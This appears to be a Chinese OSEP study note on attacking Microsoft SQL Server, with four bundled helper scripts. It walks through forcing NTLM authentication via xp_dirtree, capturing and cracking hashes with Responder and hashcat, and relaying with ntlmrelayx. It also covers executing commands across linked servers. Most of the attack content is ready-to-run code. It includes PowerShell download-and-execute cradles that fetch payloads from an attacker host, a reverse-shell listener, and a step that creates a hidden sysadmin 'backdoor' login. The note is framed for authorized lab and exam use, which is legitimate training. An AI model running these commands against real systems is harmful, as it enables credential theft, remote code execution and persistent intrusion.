::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 模块 M11：MSSQL —— 认证触发、凭据捕获/中继与 Linked Server

> 覆盖场景：44、45
>
> 教材依据：场景 44 → C4；场景 45 → C2、C6
>
> 前置依赖：一个可登录的 SQL Server 实例（SQL 认证或 Windows 认证均可）；攻击机（Kali）可被目标实例反向访问（445/SMB 出方向不被拦）；PowerUpSQL / SQLRecon / Impacket / Responder / ntlmrelayx / hashcat 按场景准备

---

## 场景 44：SQL 账户能登录，但不能运行系统命令

**场景回顾**：我们只有一个低权限数据库登录，`xp_cmdshell` / OLE / CLR 等命令执行通道全部不可用；但该 SQL 会话身份可以触发**对外网络认证**（UNC/SMB 请求），而环境中存在一台满足 SMB 中继条件（签名未强制）的另一主机，或我们可以离线破解捕获到的 Net-NTLMv2。

**前提与假设**：
- 已有一个可登录的 SQL 登录：SQL 认证（`USER`/`PASS`）或域 Windows 认证（`DOMAIN\USER`）。
- 该登录**不是** `sysadmin`，无法开 `xp_cmdshell`（这是本场景的失败点，先确认再走中继路线）。
- 目标实例可以发起向 `\\LHOST\...` 的 SMB 请求（SQL Server 进程以域账户或机器账户运行，能走 SMB 出方向；若出网受限，见"失败分支"用隧道）。
- 攻击机侧提前准备好：`Responder`、`impacket-ntlmrelayx`、`hashcat` + 字典、PowerUpSQL 模板脚本、反弹 shell 载荷。
- 目标主机的 SMB 签名状态未知——先探测，决定"捕获"还是"中继"路线。

**准备（攻击机侧）**：

1. 确认工具齐全：
   ```bash
   which responder impacket-ntlmrelayx impacket-mssqlclient hashcat
   ```
   若缺 impacket 套件：`sudo apt update && sudo apt install -y impacket-scripts responder hashcat`（Kali 自带 responder / impacket）。

2. 准备反弹 shell 载荷并做 UTF-16LE + Base64（用于中继的 `-c` 参数）：
   ```bash
   # 1) 准备 run.ps1（下载执行第二阶段）并放到 HTTP 目录
   echo -en 'IEX ((new-object net.webclient).downloadstring("http://LHOST/run.ps1"))' | iconv -t UTF-16LE | base64 -w 0
   # 2) 目录内放好 nc64.exe / 自定义 runner 等第二阶段
   python3 -m http.server 80
   ```

3. （可选）如果 SQL 实例在内网、与攻击机不在同一网段，先用 Ligolo-ng 打通回程（`Tunneling` → Ligolo-ng）：在代理会话里加监听并把攻击机 445 映射过去：
   ```
   listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
   ```
   记录最终攻击机在目标视角可达的 IP 为 `LHOST`。

4. 探测中继目标（要打的那台另一主机）的 SMB 签名：
   ```bash
   nmap -p445 --script smb2-security-mode TARGET
   # 期望：Message signing enabled but not required  → 可中继
   #       Message signing enabled and required     → 只能走"捕获+破解"
   ```

**执行步骤**：

1. 用低权限登录连接实例，确认当前权限状态（先验证"确实不能执行系统命令"）：
   ```bash
   # 从 Kali（SQL 认证）
   impacket-mssqlclient USER:PASS@TARGET -windows-auth    # 域账号用 DOMAIN/USER:PASS@TARGET
   ```
   在 mssqlclient 交互里依次执行：
   ```sql
   SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
   SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
   -- is_sa = 0 且 xp_cmdshell value_in_use = 0 → 走本场景路线
   xp_cmdshell whoami
   -- 预期：权限不足报错（xp_cmdshell 需要 sysadmin 或 CONTROL SERVER 权限）
   ```
   从 Windows（PowerShell + Invoke-SQLCmd 模板脚本亦可，见 `m11-powerupsql-templates.ps1`）。

2. 列出本实例能看到的其它 SQL 实例 / 目标（确认"另一目标满足中继条件"是哪个）：
   ```powershell
   # PowerUpSQL：SPN 扫描
   Get-SQLInstanceDomain
   # 连接测试，找出可访问且可能允许中继的实例
   Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
   ```
   或命令行 `setspn -T DOMAIN -Q MSSQLSvc/*`。

3. 路线 A —— **捕获模式（Responder + 破解）**：
   ```bash
   sudo responder -I eth0    # 换成实际监听接口；默认监听 UDP 53/137/138 + TCP 445 等
   ```
   触发 SQL 对外认证（在 mssqlclient 会话里）：
   ```sql
   EXEC master..xp_dirtree '\\LHOST\share';
   -- 低权限也常可用；若被拒见"失败分支与备选"
   ```
   Responder 预期输出（表示捕获成功）：
   ```
   [SMB] NTLMv2-SSP Client   : ::ffff:<TARGET_IP>
   [SMB] NTLMv2-SSP Username : DOMAIN\sqlservice
   [SMB] NTLMv2-SSP Hash     : sqlservice::DOMAIN:...:...:...:...
   ```
   离线破解：
   ```bash
   responder 输出里复制整行到 hash.txt
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
   ```

4. 路线 B —— **中继模式（ntlmrelayx → 满足条件的目标）**：
   ```bash
   # 监听 445；把目标上被中继的认证转发到 TARGET（该目标 SMB 签名未强制）
   # 例子：让被中继的 SMB 认证在目标上执行下载+运行，反弹回 LHOST
   impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET \
     -c "powershell -enc <步骤2生成的BASE64>"
   ```
   若目标是另一台 SQL 实例（mssql:// 中继，需要与实验环境实测确认支持）：
   ```bash
   impacket-ntlmrelayx --no-http-server -smb2support -t mssql://TARGET2
   ```
   另一终端起监听：
   ```bash
   nc -nvlp LPORT
   ```
   触发认证（在已控 SQL 会话里执行；若你有 WebShell/其它入口在同一台机器也一样）：
   ```sql
   EXEC master..xp_dirtree '\\LHOST\c';
   -- 或者用 Windows 命令： dir \\LHOST\c
   ```
   ntlmrelayx 预期输出：
   ```
   [*] SMBD-Thread-4: Received connection from <SQL_HOST>, attacking target smb://TARGET
   [*] Authenticating against smb://TARGET as DOMAIN\sqlservice SUCCEED
   [*] Executed specified command on host: TARGET
   ```

5. 处置产物：
   - 捕获模式拿到明文密码 → 直接横向（netexec smb / psexec / WinRM）。
   - 拿到 NTLM hash（破解不出）→ 尝试 Pass-The-Hash 到其它复用密码的主机。
   - 中继模式成功 → 检查反弹 shell 监听端；无 shell 先确认 AV/AMSI（转 M05/M07 处理）。

6. 后续在 SQL 上真正取得执行权限的常见跳板（如果环境里其实还有 `sysadmin` 或可模拟对象）：
   ```powershell
   # PowerUpSQL 审计（发现可模拟的登录等）
   Invoke-SQLAudit -Verbose -Instance TARGET
   Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit
   ```
   详见 `m11-powerupsql-templates.ps1`（模拟、CLR 等模板）与场景 45（Linked Server 路线）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m11-responder-relay-sql.sh` | 一键起 Responder 捕获 / ntlmrelayx 中继 + 打印 SQL 触发命令 | `LHOST`、`LPORT`、`TARGET` |
| `m11-powerupsql-templates.ps1` | 实例发现、权限确认、审计、模拟/执行 | `-Instance TARGET` |
| `m11-sqlrecon-templates.ps1` | SQLRecon 对照模板（/m:info /m:xpcmd 等） | `/h:TARGET /a:WinToken` |
| `m11-linked-server-queries.sql` | 需要跨实例枚举时的查询集（本场景可用于确认"另一个实例"） | 见文件头 |

#### `m11-powerupsql-templates.ps1` {#m11-powerupsql-templates-ps1}

````powershell
<#
用途：PowerUpSQL 侦察与执行模板——实例发现、权限确认、链接爬取(单跳/多跳)、
      Invoke-SQLOSCmd / CLR / OLE、Impersonation 审计
场景：M11 场景 44（确认低权限 + 找可模拟对象）与场景 45（Get-SQLServerLinkCrawl 跨跳执行）
依赖：PowerUpSQL 模块（需提前导入：Import-Module .\PowerUpSQL.psd1 或用官方安装脚本）；
      运行时所在主机能连到目标 1433；域发现类命令需域内 Windows 主机
使用：.\m11-powerupsql-templates.ps1 -Instance TARGET
      .\m11-powerupsql-templates.ps1 -Instance TARGET -Username sa -Password 'P@ssw0rd'
      （不传 Username/Password 时用当前 Windows 上下文做 Windows 认证）
占位符：TARGET=SQL 实例(可含 \实例名)  USER PASS DOMAIN LHOST LPORT
测试状态：未在 Windows + PowerUpSQL 环境实测；语法已人工检查，失败路径有 try/catch 提示
注意：本脚本只自动跑"只读"侦察；开 xp_cmdshell / 建登录 / -Exploit 等动作全部只打印
      模板命令，由你确认后再手动执行
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Instance,
    [string]$Username,
    [string]$Password
)

# 构建通用参数（PowerUpSQL 多数 cmdlet 接受 -Username/-Password/-Domain）
$common = @{ Instance = $Instance }
if ($Username) {
    $common.Username = $Username
    $common.Password = $Password
}

function Section([string]$t) { Write-Output ""; Write-Output ("=" * 14 + " $t " + "=" * 14) }
function Try-PuSql([string]$label, [scriptblock]$block) {
    try { Write-Output ("[+] {0}" -f $label); & $block }
    catch { Write-Output ("[-] {0} 失败：{1}" -f $label, $_.Exception.Message) }
}

# 0) 模块可用性检查
if (-not (Get-Command Get-SQLServerInfo -ErrorAction SilentlyContinue)) {
    Write-Output "[!] 未找到 PowerUpSQL cmdlet。先执行: Import-Module .\PowerUpSQL.psd1"
    Write-Output "    或在目标上 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')"
    Write-Output "    （来源请用你信任的离线副本，考试环境未必能出网）"
}

Section "0. 连接测试与服务器信息"
Try-PuSql "Get-SQLServerInfo"       { Get-SQLServerInfo @common -Verbose }
Try-PuSql "当前登录与 sysadmin?"    { Get-SQLQuery @common -Query "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;" }

Section "1. 域内 SQL 实例发现（需加域 Windows 上下文）"
Try-PuSql "SPN 扫描" {
    Get-SQLInstanceDomain
}
Try-PuSql "广播/连接测试" {
    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
}

Section "2. 本实例的链接服务器（场景 45 第一步）"
Try-PuSql "列链接" {
    Get-SQLQuery @common -Query "SELECT name, is_rpc_out_enabled, is_data_access_enabled FROM sys.servers WHERE is_linked=1;"
}
Try-PuSql "链接爬取-拓扑" {
    Get-SQLServerLinkCrawl @common -Verbose
}

Section "3. 链接爬取-跨跳执行（场景 45 主用：自动逐跳执行并回传结果）"
# 只读示例：
Try-PuSql "跨跳执行 SELECT @@SERVERNAME" {
    Get-SQLServerLinkCrawl @common -Query "SELECT @@SERVERNAME" -QueryOnLink
}
# 命令执行示例（模板，需远端身份有权限；确认后手动执行）：
Write-Output ""
Write-Output "[*] 远端开 xp_cmdshell + 执行（手动执行模板）："
Write-Output "    Get-SQLServerLinkCrawl -Instance $Instance -Query `"exec master..xp_cmdshell 'whoami'`" -QueryOnLink -Verbose"
Write-Output "    单跳等价写法:"
Write-Output "    Get-SQLQuery -Instance $Instance -Query `"EXEC ('xp_cmdshell ''whoami''') AT [LINK_NAME]`""

Section "4. 命令执行通道（本机 sysadmin 或提权后）"
Try-PuSql "Invoke-SQLOSCmd whoami" {
    Invoke-SQLOSCmd @common -Command "whoami" -RawResults
}
Write-Output "[*] 若 xp_cmdshell 被拦/未启用，模板备选："
Write-Output "    Invoke-SQLOSCmdCLR  -Instance $Instance -Command 'powershell.exe whoami' -RawResults   # CLR"
Write-Output "    Invoke-SQLOSCmdOle  -Instance $Instance -Command 'powershell.exe -c whoami' -RawResults  # OLE"
Write-Output "    开 xp_cmdshell（手动）: EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"

Section "5. Impersonation 审计（低权限→sysadmin 常见捷径）"
Try-PuSql "可模拟对象清单" {
    Invoke-SQLAuditPrivImpersonateLogin @common -Verbose
}
Write-Output "[*] 发现有可模拟的 sa/高权登录后（手动执行，会改会话上下文）："
Write-Output "    Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
Write-Output "    或 SQL: EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER; REVERT;"

Section "6. 通用审计（一次性扫常见配置问题）"
Try-PuSql "Invoke-SQLAudit" {
    Invoke-SQLAudit @common -Verbose
}

Write-Output ""
Write-Output "[*] 用到的行改占位符即可复制进考试笔记；先跑只读侦察，动作类命令逐条确认。"
````

#### `m11-responder-relay-sql.sh` {#m11-responder-relay-sql-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# 用途：MSSQL 对外认证触发的一键编排——Responder 捕获(→hashcat) 或 ntlmrelayx
#       中继到 SMB 目标；并打印要在 SQL 会话里执行的触发语句与后续命令
# 场景：M11 场景 44（低权限 SQL 登录 → xp_dirtree 等触发服务账户 SMB 认证）
# 依赖：root（绑定 445）；Kali 自带 responder / impacket-ntlmrelayx / hashcat；
#       nmap（可选，仅打印签名检查建议）；目标 SQL 可达
# 使用：sudo ./m11-responder-relay-sql.sh -i tun0 -m capture
#       sudo ./m11-responder-relay-sql.sh -i tun0 -m relay -t 10.10.10.20 \
#            -c 'powershell -nop -w hidden -enc <BASE64>'
#       ./m11-responder-relay-sql.sh -i tun0 -m relay -t 10.10.10.20 -d   # 只打印不执行
# 占位符：LHOST=攻击机 IP  LPORT=监听端口  TARGET/TARGET2=SQL/中继目标
# 测试状态：未在真实环境实测；本机 bash -n 语法通过，逻辑为前台运行 + 提示输出
# 注意：Responder 与 ntlmrelayx 不能同时占 445；中继账户须是中继目标的本地管理员，
#       且目标 SMB 签名未强制（先跑签名检查）
# =============================================================================
set -euo pipefail

IFACE=""
MODE="capture"          # capture | relay
RELAY_TARGET=""
CMD=""
DRY=0
LHOST=""
LOOT_DIR="$HOME/osep/loot/mssql"
TRIGGER_SHARE="a"       # xp_dirtree 触发的共享名，不存在也能触发认证

usage() {
    sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'
    cat <<EOF

参数：
  -i <iface>  监听接口（必填，如 tun0）
  -m <mode>   capture=Responder 捕获+破解（默认） | relay=ntlmrelayx 中继
  -t <host>   relay 模式的中继目标（IP 或 smb://IP）
  -c <cmd>    relay 模式要在目标执行的命令（如 powershell -enc ...）
  -l <ip>     攻击机 IP（用于打印触发语句中的 \\\\LHOST）
  -d          仅打印命令，不实际启动监听
  -h          帮助
EOF
    exit 0
}

while getopts "i:m:t:c:l:dh" opt; do
    case "$opt" in
        i) IFACE="$OPTARG" ;;
        m) MODE="$OPTARG" ;;
        t) RELAY_TARGET="$OPTARG" ;;
        c) CMD="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        d) DRY=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

[ -z "$IFACE" ] && { echo "[!] 缺少 -i 接口参数"; usage; }
case "$MODE" in capture|relay) ;; *) echo "[!] -m 只接受 capture|relay"; exit 1 ;; esac
if [ "$MODE" = "relay" ] && [ -z "$RELAY_TARGET" ]; then
    echo "[!] relay 模式需要 -t 中继目标"; exit 1
fi
[ -z "$LHOST" ] && LHOST="LHOST"   # 打印时仍可手动替换
mkdir -p "$LOOT_DIR"

# 短 payload base64 编码辅助（UTF-16LE → base64，供 -c 或 xp_cmdshell 用）
ps_b64() {
    local text="$1"
    printf '%s' "$text" | iconv -t UTF-16LE | base64 -w 0
    echo
}

preflight() {
    [ "$(id -u)" = "0" ] || { echo "[!] 需要 root（绑定 445）：sudo $0 $*"; exit 1; }
    command -v responder    >/dev/null || { echo "[!] 缺 responder"; exit 1; }
    command -v impacket-ntlmrelayx >/dev/null || { echo "[!] 缺 impacket-ntlmrelayx"; exit 1; }
    if ss -ltn 2>/dev/null | grep -q ':445 '; then
        echo "[!] 445 已被占用（可能 Responder 已在跑），先停掉再继续"; exit 1
    fi
}

print_trigger() {
    cat <<EOF

================ 在 SQL 会话里执行（impacket-mssqlclient 交互 / SSMS）========
-- 1) 确认权限（本场景预期 is_sa=0）
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;

-- 2) 触发 SQL Server 服务账户向攻击机发起 SMB 认证（低权限常可用）：
EXEC master..xp_dirtree '\\\\${LHOST}\\${TRIGGER_SHARE}';
-- 备选触发（xp_dirtree 被拒时逐个试）：
EXEC master..xp_subdirs '\\\\${LHOST}\\${TRIGGER_SHARE}';
EXEC master..xp_fileexist '\\\\${LHOST}\\${TRIGGER_SHARE}';
-- 库级 BACKUP 权限可用时：BACKUP DATABASE [master] TO DISK = '\\\\${LHOST}\\share\\b.bak';
================================================================================
EOF
}

print_loot() {
    echo "[*] 捕获产物目录：$LOOT_DIR"
    echo "[*] 破解：hashcat -m 5600 $LOOT_DIR/hash.txt /usr/share/wordlists/rockyou.txt"
    echo "[*] 短 payload 编码示例："
    ps_b64 'IEX((New-Object Net.WebClient).DownloadString("http://LHOST/p.ps1"))' \
        | sed 's/^/    /'
}

if [ "$DRY" = "1" ]; then
    echo "[DRY] 将执行："
    echo "  responder:  sudo responder -I $IFACE"
    echo "  ntlmrelayx: sudo impacket-ntlmrelayx --no-http-server -smb2support -t smb://$RELAY_TARGET -c '$CMD'"
    print_trigger
    print_loot
    exit 0
fi

preflight

# 中继前先提示签名检查（nmap 可选，未装也能继续）
if [ "$MODE" = "relay" ]; then
    echo "[*] 建议先确认中继目标 SMB 签名未强制："
    echo "    nmap -p445 --script smb2-security-mode $RELAY_TARGET"
    echo "    crackmapexec smb $RELAY_TARGET --signing-check"
    [ -n "$CMD" ] || CMD="whoami"   # 空命令时给个安全默认，便于验证链路
fi

print_trigger

if [ "$MODE" = "capture" ]; then
    echo "[*] 启动 Responder（Ctrl-C 停止，日志在屏幕）……"
    sudo responder -I "$IFACE" | tee "$LOOT_DIR/responder-$(date +%H%M%S).log"
else
    echo "[*] 启动 ntlmrelayx → smb://$RELAY_TARGET（Ctrl-C 停止）……"
    sudo impacket-ntlmrelayx --no-http-server -smb2support \
        -t "smb://$RELAY_TARGET" -c "$CMD"
fi

print_loot
````

#### `m11-sqlrecon-templates.ps1` {#m11-sqlrecon-templates-ps1}

````powershell
<#
用途：SQLRecon.exe 模板封装——枚举(sqlspns)、info/whoami、links 系列、
      enablexp/xpcmd、enableole/olecmd、impersonate 组合
场景：M11 场景 44/45（在已有 Windows 会话/落脚点上投递 SQLRecon.exe 后使用）
依赖：SQLRecon.exe（需先投递到 Windows 目标，如 c:\windows\tasks\SQLRecon.exe）；
      认证参数 /a:WinToken 用当前 Windows 令牌（最常见），SQL 认证用 /a:Local /u: /p:
使用：.\m11-sqlrecon-templates.ps1 -ReconExe .\SQLRecon.exe -Host TARGET
      函数名即模块名，见下方 EXAMPLES；单条也可直接照抄注释里的命令行
占位符：TARGET=SQL 主机(或 主机\实例)  DOMAIN USER PASS LHOST LPORT
测试状态：未在 Windows + SQLRecon 环境实测；仅按 cheat sheet 收录模块整理参数形状
注意：SQLRecon 参数大小写/简写以你下载版本 README 为准（如 /h: 与 /host: 新旧版有别）
#>
[CmdletBinding()]
param(
    [string]$ReconExe = ".\SQLRecon.exe",   # 投递后的路径
    [string]$Target,                        # -Host TARGET
    [string]$Auth = "WinToken",             # WinToken(默认) / Local(SQL认证) / Token / Windows
    [string]$Domain,
    [string]$User,
    [string]$Pass
)

# 认证相关参数
function Get-AuthArgs {
    $a = @("/a:$Auth")
    if ($Domain) { $a += "/d:$Domain" }
    if ($User)   { $a += "/u:$User" }
    if ($Pass)   { $a += "/p:$Pass" }
    return $a
}

# 通用调用器：Invoke-M11SqlRecon -Module xpcmd -Command "whoami" [-Impersonate sa]
function Invoke-M11SqlRecon {
    param(
        [Parameter(Mandatory = $true)][string]$Module,   # 见下方模块清单
        [string]$Command,                                 # 需要命令参数的模块用
        [string]$Impersonate                              # /i:sa 组合用
    )
    $args = @($script:ReconExe) + (Get-AuthArgs)
    if ($script:Target) { $args += "/h:$($script:Target)" }
    if ($Impersonate)   { $args += "/i:$Impersonate" }
    $args += "/m:$Module"
    if ($Command) { $args += "/c:$Command" }
    Write-Output ("[>] " + ($args -join ' '))
    & $args
}

# ---------------------------------------------------------------------------
# 模块清单（按 cheat sheet MSSQL → SQLRecon 收录；无输出模块 = 直接执行无回显）
#   /enum:sqlspns         域内 SPN 枚举（用 /d:DOMAIN，不用 /h:）
#   /m:info /m:whoami     服务器信息 / 当前身份
#   /m:links /m:linkinfo  列链接 / 链接详情
#   /m:linkquery /m:linkcmd  经链接查询 / 经链接执行命令（需远端权限，场景 45）
#   /m:impersonate        列出可模拟登录（配合 /i: 与另一模块）
#   /m:enablexp /m:xpcmd  开 xp_cmdshell / 执行命令
#   /m:enableole /m:olecmd  开 OLE 自动化 / OLE 执行（无控制台回显）
# ---------------------------------------------------------------------------

Write-Output "===== EXAMPLES（可直接复制到 shell，替换占位符）====="
@"

-- 域内 SQL 发现
.\SQLRecon.exe /enum:sqlspns /d:DOMAIN

-- 基本侦察（场景 44：先确认身份/权限）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:info
.\SQLRecon.exe /a:WinToken /h:TARGET /m:whoami

-- 低权限可执行名单：可模拟对象（场景 44 提权备选）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate

-- 组合：模拟 sa 后开 xp_cmdshell 并执行（场景 44 落地）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:enablexp
.\SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:xpcmd /c:"whoami /all"

-- 已 sysadmin：直接开 + 执行
.\SQLRecon.exe /a:WinToken /h:TARGET /m:enablexp
.\SQLRecon.exe /a:WinToken /h:TARGET /m:xpcmd /c:"whoami /all"

-- 链接侦察（场景 45）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:links
.\SQLRecon.exe /a:WinToken /h:TARGET /m:linkquery /c:"SELECT @@SERVERNAME"
.\SQLRecon.exe /a:WinToken /h:TARGET /m:linkcmd /c:"whoami"

-- 命令被 AV/限制挡时的 OLE 通道（无回显，配合反连/写文件验证）
.\SQLRecon.exe /a:WinToken /h:TARGET /m:enableole
.\SQLRecon.exe /a:WinToken /h:TARGET /m:olecmd /c:"powershell.exe -c iex(iwr http://LHOST/met.ps1)"

-- SQL 认证形态（需要凭据时）
.\SQLRecon.exe /a:Local /h:TARGET /u:sa /p:PASS /m:info
"@ | Write-Output

# ---------------------------------------------------------------------------
# 调用封装示例（本脚本带 -Target/-Auth 跑只读侦察时）
# ---------------------------------------------------------------------------
if ($Target) {
    Write-Output ""
    Write-Output "===== 只读侦察输出 ====="
    Invoke-M11SqlRecon -Module info
    Invoke-M11SqlRecon -Module whoami
    Invoke-M11SqlRecon -Module links
}
````

#### `m11-linked-server-queries.sql` {#m11-linked-server-queries-sql}

````sql
-- ============================================================================
-- 用途：Linked Server 侦察与远程执行模板——单跳/多跳、EXEC ... AT、引号转义、
--       OPENQUERY 备选、RPC/映射排查
-- 场景：M11 场景 45（Linked Server 能查询，但远程执行失败）；场景 44 用其发现其它实例
-- 依赖：SQL Server 2008+；在 impacket-mssqlclient 交互会话、SSMS 或 sqlcmd 中逐段执行
--       （impacket-mssqlclient 另自带 enable_xp_cmdshell / xp_cmdshell 快捷命令）
-- 使用：登录后按段复制执行；把 LINK1 / LINK2 换成实际链接服务器名
--       （链接名含反斜杠如 10.0.0.5\SQLEXPRESS 时用方括号 [10.0.0.5\SQLEXPRESS] 括起）
-- 占位符：LINK1=一跳远端实例  LINK2=二跳远端实例  LHOST=攻击机 IP  BASE64=短 payload
-- 测试状态：未在真实 SQL 实例实测（无本地实例）；单引号翻倍规则已逐层人工核对
-- 引号铁律：SQL 字符串内的单引号一律翻倍 ''；每嵌套一层 EXEC ... AT，引号整体再翻一倍
-- ============================================================================

-- ---------------------------------------------------------------------------
-- 第 1 段：先确认"我自己"在本地实例的权限与 xp_cmdshell 状态
-- ---------------------------------------------------------------------------
SELECT SYSTEM_USER AS login_user, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- ---------------------------------------------------------------------------
-- 第 2 段：列出全部链接与开关（"能查询"看 data access，"能远程执行"看 rpc out）
-- ---------------------------------------------------------------------------
SELECT name, product, is_linked,
       is_rpc_out_enabled      AS rpc_out,          -- EXEC ... AT 依赖此项
       is_data_access_enabled  AS data_access,      -- OPENQUERY 依赖此项
       is_remote_login_enabled
FROM sys.servers WHERE is_linked = 1;

EXEC sp_linkedservers;                             -- 兼容旧版/信息更全

-- ---------------------------------------------------------------------------
-- 第 3 段：实测"查询通、执行不通"的边界
-- ---------------------------------------------------------------------------
-- (a) OPENQUERY 单跳查询：只依赖 data access，不依赖 rpc out
SELECT * FROM OPENQUERY([LINK1],
    'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u,
            IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');

-- (b) EXEC ... AT：依赖 rpc out。失败报错决定下一步：
--     "is not configured for RPC" / "not enabled for remote procedure call"
--       → rpc out 关闭 → 第 4 段
--     "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'" → 双跳委派问题 → 第 8 段注
EXEC ('SELECT @@SERVERNAME') AT [LINK1];

-- ---------------------------------------------------------------------------
-- 第 4 段：修开关（需要 sysadmin / ALTER ANY LINKED SERVER；低权限先试 EXECUTE AS）
-- ---------------------------------------------------------------------------
EXECUTE AS LOGIN = 'sa';                           -- 仅当你有 IMPERSONATE 权限才成功
EXEC sp_serveroption 'LINK1', 'rpc out', 'true';
EXEC sp_serveroption 'LINK1', 'data access', 'true';
REVERT;

SELECT name, is_rpc_out_enabled, is_data_access_enabled
FROM sys.servers WHERE name = 'LINK1';

-- ---------------------------------------------------------------------------
-- 第 5 段：rpc out 关着、又改不了时——用 OPENQUERY "读" xp_cmdshell 的输出
-- （xp_cmdshell 的结果集可被 OPENQUERY 当作表来读；前提：远端 xp_cmdshell 可用
--   且该链接 data access = true）
-- ---------------------------------------------------------------------------
SELECT * FROM OPENQUERY([LINK1], 'EXEC master..xp_cmdshell ''whoami''');

-- ---------------------------------------------------------------------------
-- 第 6 段：远端映射账户是谁（权限差异的核心）
-- ---------------------------------------------------------------------------
SELECT s.name AS link,
       l.remote_name,                              -- 远端登录名；NULL/空串 = guest
       l.uses_self_credential                      -- 1=以本地登录同名身份映射
FROM sys.servers s
LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id
WHERE s.is_linked = 1;

-- 实测远端身份（在 LINK1 上执行并回传）
SELECT * FROM OPENQUERY([LINK1],
    'SELECT SYSTEM_USER AS remote_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');

-- ---------------------------------------------------------------------------
-- 第 7 段：单跳执行链（远端身份是 sysadmin 时）——按顺序执行
-- ---------------------------------------------------------------------------
-- (1) 在 LINK1 上远程开 xp_cmdshell（'show advanced options' 需同时开）
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;
       sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [LINK1];

-- (2) 验证远程命令执行
EXEC ('xp_cmdshell ''whoami''') AT [LINK1];

-- (3) 短 payload 执行（最稳形态）：
--     先在 Kali 上生成 BASE64（下载器本身，长度可控）：
--     echo -en 'IEX((New-Object Net.WebClient).DownloadString("http://LHOST/p.ps1"))' \
--       | iconv -t UTF-16LE | base64 -w 0
EXEC ('xp_cmdshell ''powershell -nop -w hidden -enc BASE64''') AT [LINK1];

-- (4) 若远端映射了 sa 而你想以后直连远端（持久化动作，谨慎，考试按题目决定）：
EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT [LINK1];
EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT [LINK1];
-- 然后从 Kali 直连：impacket-mssqlclient backdoor:P@ssw0rd!@LINK1_HOST

-- ---------------------------------------------------------------------------
-- 第 8 段：多跳 A → B(LINK1) → C(LINK2)：每层 EXEC AT 嵌套，引号整体翻倍
-- ---------------------------------------------------------------------------
-- 先在 B 上看它还有哪些链接（B 视角的 sys.servers）
SELECT * FROM OPENQUERY([LINK1],
    'SELECT name FROM sys.servers WHERE is_linked = 1');

-- 从 A 出发在 C 上执行 whoami（解析后 A→B 发送的字符串是：
--   EXEC ('xp_cmdshell ''whoami''') AT [LINK2]，B 收到后再在 C 上执行）
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINK2]') AT [LINK1];

-- 多跳远程开 xp_cmdshell（同规则，逐层翻倍；'show advanced options' 同理）
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;
              sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [LINK2]') AT [LINK1];

-- 多跳查询（内层 OPENQUERY 的引号全部翻倍）
SELECT * FROM OPENQUERY([LINK1],
    'SELECT * FROM OPENQUERY([LINK2], ''SELECT @@SERVERNAME AS srv'')');

-- 注：若报 "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'"
--     → B→C 需要传递凭据（Kerberos 双跳）被拦；备选：从 B 读 C 的连接串后用
--       mssqlclient 直连 C（端口可达时），或放弃执行只做数据读取。

-- ---------------------------------------------------------------------------
-- 第 9 段：常见报错速查
-- ---------------------------------------------------------------------------
-- "is not configured for RPC" / "not enabled for remote procedure call"
--     → 该链接 rpc out = false → 第 4 段开启；无权开 → 第 5 段 OPENQUERY 读执行
-- "Ad Hoc Distributed Queries" / "cannot be used for distributed queries"
--     → data access / 分布式查询未开 → 第 4 段开 data access
-- "EXECUTE permission denied on object 'xp_cmdshell'"
--     → 远端映射账户非 sysadmin → 第 6 段查映射；在本地提权到 sysadmin 后再走链接
-- "Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'"
--     → 双跳委派问题 → 第 8 段注
-- "Msg 102 / Incorrect syntax near ..."
--     → 十有八九是引号层数不对 → 对照第 8 段逐层翻倍
-- ============================================================================
````

**验证**：
- Responder 窗口出现 `[SMB] NTLMv2-SSP Hash` 行 → 捕获成功；hashcat 出明文 → 凭据可用（`netexec smb` 或 `evil-winrm` 验证）。
- ntlmrelayx 出现 `Authenticating ... SUCCEED` 与 `Executed specified command on host` → 中继执行成功；反向 shell 端出现连接。
